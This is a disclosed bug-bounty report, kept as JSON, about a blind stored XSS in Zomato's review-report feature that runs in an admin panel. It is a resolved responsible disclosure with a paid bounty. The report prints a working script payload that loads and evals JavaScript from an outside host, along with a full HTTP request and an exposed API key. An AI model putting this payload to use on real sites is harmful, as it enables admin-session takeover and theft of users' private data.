{"id":314126,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTQxMjY=","url":"https://hackerone.com/reports/314126","title":"Blind XSS - Report review - Admin panel","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-02-09T08:29:03.069Z","submitted_at":"2018-02-09T08:29:03.069Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"gerben_javado","url":"/gerben_javado","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-03-29T17:45:40.493Z","bug_reporter_agreed_on_going_public_at":"2018-03-29T13:41:29.357Z","team_member_agreed_on_going_public_at":"2018-03-29T17:45:40.232Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#Introduction\nIn the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on https://www.zomato.com████████/reviews_new?review_id={ID}. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using `XMLHttpRequest`.\n\n#Steps to reproduce\n1. Replace the `X-Access-Token` to your access token and the `review_id` to a review you can report.\n2. Send the request in Burp\n3. Go to https://www.zomato.com██████████/reviews_new?review_id={ID}\n4. XSS payload executes\n\n```http\nPOST /v2/█████merchant HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 485\nHost: api.zomato.com\nX-Zomato-API-Key: a2cf52f6036511e48be6b2227cce2b54\nX-Access-Token: dc5da████████ad0fdddff04\nX-Client-Id: zomato_merchantandroid_v2\n\nreason_id=5\u0026review_id=32288944\u0026additional_text=\u003cscript\u003efunction b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//ks.xss.ht\");a.send();\u003c/script\u003e\n```\n\n#Screenshot Admin Panel\n{█████}\n\n#Dom Snippet\n```html\n \u003cu\u003eReported by Merchant(ID)\u003c/u\u003e : \u003ca style=\"opacity: 1; color: #000000; text-decoration:underline\" href=\"https://www.zomato.com/users/43211589\"\u003e43211589\u003c/a\u003e\u003cbr\u003e\u003cu\u003eReport Reason ID\u003c/u\u003e : 5 (Other (mention reason below).)\u003cbr\u003e\u003cu\u003eAdditional Text\u003c/u\u003e : H\nH\nH\nH\nH\n''\"\u0026gt;\u003cscript\u003efunction b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//ks.xss.ht\");a.send();\u003c/script\u003e\n```\n\n## Impact\n\nAn attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.\n\nThe hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\n\n**URL**\nhttps://www.zomato.com██████████/reviews_new\n\n**Verified**\nYes\n\n","vulnerability_information_html":"\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\n\u003cp\u003eIn the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on \u003ca title=\"https://www.zomato.xn--com-s74aaaaaaaa/reviews_new?review_id=%7BID%7D\" href=\"/redirect?url=https%3A%2F%2Fwww.zomato.xn--com-s74aaaaaaaa%2Freviews_new%3Freview_id%3D%257BID%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.zomato.xn--com-s74aaaaaaaa/reviews_new?review_id=%7BID%7D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using \u003ccode\u003eXMLHttpRequest\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003eReplace the \u003ccode\u003eX-Access-Token\u003c/code\u003e to your access token and the \u003ccode\u003ereview_id\u003c/code\u003e to a review you can report.\u003c/li\u003e\n\u003cli\u003eSend the request in Burp\u003c/li\u003e\n\u003cli\u003eGo to \u003ca title=\"https://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new?review_id=%7BID%7D\" href=\"/redirect?url=https%3A%2F%2Fwww.zomato.xn--com-s74aaaaaaaaaa%2Freviews_new%3Freview_id%3D%257BID%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new?review_id=%7BID%7D\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eXSS payload executes\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/v2/█████merchant\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e485\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapi.zomato.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Zomato-API-Key\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ea2cf52f6036511e48be6b2227cce2b54\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Access-Token\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003edc5da████████ad0fdddff04\u003c/span\u003e\n\u003cspan class=\"na\"\u003eX-Client-Id\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ezomato_merchantandroid_v2\u003c/span\u003e\n\nreason_id=5\u0026amp;review_id=32288944\u0026amp;additional_text=\u0026lt;script\u0026gt;function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\u0026quot;load\u0026quot;, b);a.open(\u0026quot;GET\u0026quot;, \u0026quot;//ks.xss.ht\u0026quot;);a.send();\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"screenshot-admin-panel\"\u003eScreenshot Admin Panel\u003c/h1\u003e\n\n\u003cp\u003e{█████}\u003c/p\u003e\n\n\u003ch1 id=\"dom-snippet\"\u003eDom Snippet\u003c/h1\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e \u003cspan class=\"nt\"\u003e\u0026lt;u\u0026gt;\u003c/span\u003eReported by Merchant(ID)\u003cspan class=\"nt\"\u003e\u0026lt;/u\u0026gt;\u003c/span\u003e : \u003cspan class=\"nt\"\u003e\u0026lt;a\u003c/span\u003e \u003cspan class=\"na\"\u003estyle=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;opacity: 1; color: #000000; text-decoration:underline\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.zomato.com/users/43211589\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e43211589\u003cspan class=\"nt\"\u003e\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt;\u0026lt;u\u0026gt;\u003c/span\u003eReport Reason ID\u003cspan class=\"nt\"\u003e\u0026lt;/u\u0026gt;\u003c/span\u003e : 5 (Other (mention reason below).)\u003cspan class=\"nt\"\u003e\u0026lt;br\u0026gt;\u0026lt;u\u0026gt;\u003c/span\u003eAdditional Text\u003cspan class=\"nt\"\u003e\u0026lt;/u\u0026gt;\u003c/span\u003e : H\nH\nH\nH\nH\n\u0026#39;\u0026#39;\u0026quot;\u003cspan class=\"ni\"\u003e\u0026amp;gt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\u003cspan class=\"nb\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresponseText\u003c/span\u003e\u003cspan class=\"p\"\u003e)};\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eaddEventListener\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eload\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eGET\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e//ks.xss.ht\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAn attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.\u003c/p\u003e\n\n\u003cp\u003eThe hacker selected the \u003cstrong\u003eCross-site Scripting (XSS) - Stored\u003c/strong\u003e weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eURL\u003c/strong\u003e\u003cbr\u003e\n\u003ca title=\"https://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new\" href=\"/redirect?url=https%3A%2F%2Fwww.zomato.xn--com-s74aaaaaaaaaa%2Freviews_new\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.zomato.xn--com-s74aaaaaaaaaa/reviews_new\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVerified\u003c/strong\u003e\u003cbr\u003e\nYes\u003c/p\u003e\n","bounty_amount":"350.0","formatted_bounty":"$350","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-04-28T13:41:29.414Z","allow_singular_disclosure_after":-84297079.63759804,"singular_disclosure_allowed":true,"vote_count":35,"voters":["sp1d3rs","europa","muon4","ramsexy","spam404","sameerphad72","s_p_q_r","flashdisk","mygf","nathonsecurity","and 25 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":383,"asset_type":"URL","asset_identifier":"*.zomato.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2369727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there @gerben_javado  - thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you.","markdown_message":"\u003cp\u003eHi there \u003ca href=\"/gerben_javado\"\u003e@gerben_javado\u003c/a\u003e  - thanks for sending this in! We are currently reviewing this submission and we\u0026#39;ll notify you once we have more information to share with you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-02-10T00:49:21.369Z","updated_at":"2018-02-10T00:49:21.369Z","actor":{"username":"chessmast3r","cleared":false,"url":"/chessmast3r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/220/459/6b3c5fca9df9cde7fe36b55238b13d2cea86ea80_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2476651,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-09T10:28:21.770Z","updated_at":"2018-03-09T10:28:21.770Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"gerben_javado","url":"/gerben_javado"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2542772,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T06:38:16.434Z","updated_at":"2018-03-29T06:38:16.434Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"100.0","genius_execution_id":null,"team_handle":"zomato","collaborator":{"username":"gerben_javado","url":"/gerben_javado"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2544185,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T13:41:29.385Z","updated_at":"2018-03-29T13:41:29.385Z","first_to_agree":true,"actor":{"username":"gerben_javado","cleared":false,"url":"/gerben_javado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nxCLVa5sJm5BsdGjBdqzDfg8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544827,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T17:43:25.077Z","updated_at":"2018-03-29T17:43:25.077Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":117110,"new_severity_id":133687},"actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544837,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks @gerben_javado for helping us in keeping @zomato secure :)\n\nCheers.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/gerben_javado\"\u003e@gerben_javado\u003c/a\u003e for helping us in keeping \u003ca href=\"/zomato\"\u003e@zomato\u003c/a\u003e secure :)\u003c/p\u003e\n\n\u003cp\u003eCheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-29T17:45:40.265Z","updated_at":"2018-03-29T17:45:40.265Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2544838,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-29T17:45:40.525Z","updated_at":"2018-03-29T17:45:40.525Z","actor":{"username":"prateek_0490-zomato","cleared":false,"url":"/prateek_0490-zomato","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/CL56d6XwY4TN3eHc73df8AEU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}